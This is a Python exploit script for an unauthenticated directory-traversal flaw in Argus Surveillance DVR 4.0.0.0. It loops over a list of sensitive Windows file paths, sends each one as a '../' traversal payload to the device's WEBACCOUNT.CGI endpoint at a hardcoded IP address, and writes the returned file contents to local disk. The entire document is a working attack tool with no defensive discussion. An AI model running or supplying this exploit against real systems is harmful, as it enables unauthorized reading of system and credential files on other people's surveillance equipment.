#!/usr/bin/python3

# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Vendor: www.argussurveillance.com
#
# Description:
# This script uses the Argus Surveillance DVR 4.0.0.0 exploit that allows Unauthenticated Directory Traversal to  
# iterate over a text file of sensitive Windows file paths.
import argparse
import requests

def path_list():
    paths = []

    with open('windows.txt', 'r') as file:
        paths = file.readlines()
    return paths

def format_path(paths):
    formatted_paths = []
    for path in paths:
        path = path.strip(" \n")
        path = path.replace("\\", "/")
        path = path.replace("C:/", "")
        formatted_paths.append(path)

    return formatted_paths

def grab_files(paths):
    url = "http://192.168.58.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE="
    LFI = "../../../../../../../../../../../../../../../../"
    QUERY = "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

    for path in paths:
        payload = url + LFI + path + QUERY
        response = requests.get(payload)
        if response.status_code == 200:
            path_split = path.split("/")
            name = path_split[len(path_split) - 2] + "-" + path_split[len(path_split) - 1]
            name = name.replace(".", "-")
            with open(name, "w") as file:
                file.write(response.text)


def main():
    paths = path_list()
    formatted_path = format_path(paths)
    grab_files(formatted_path)


if __name__ == "__main__":
    main()
